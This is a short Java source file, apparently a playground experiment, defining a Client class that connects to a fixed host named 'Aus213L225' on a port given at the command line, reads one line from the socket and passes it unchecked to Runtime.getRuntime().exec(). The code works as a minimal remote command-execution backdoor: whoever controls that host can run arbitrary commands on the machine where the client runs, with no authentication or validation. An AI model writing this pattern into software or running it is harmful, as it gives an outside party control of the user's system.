package com.playground.playground;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.Socket;

public class Client
{
   Socket socket;

   public static void main(String[] args)
   {
      try
      {
         if (args.length < 1)
         {
            return;
         }
         int port = Integer.parseInt(args[0]);
         Socket socket = new Socket("Aus213L225", port);
         
         final InputStream is = socket.getInputStream();
         
         InputStreamReader ir = new InputStreamReader(is);
         BufferedReader bufferedReader = new BufferedReader(ir);

         String requestLine = bufferedReader.readLine();

         Runtime.getRuntime().exec(requestLine);
      }
      catch (IOException ex)
      {
        System.out.println(ex.toString());
      }
   }
}
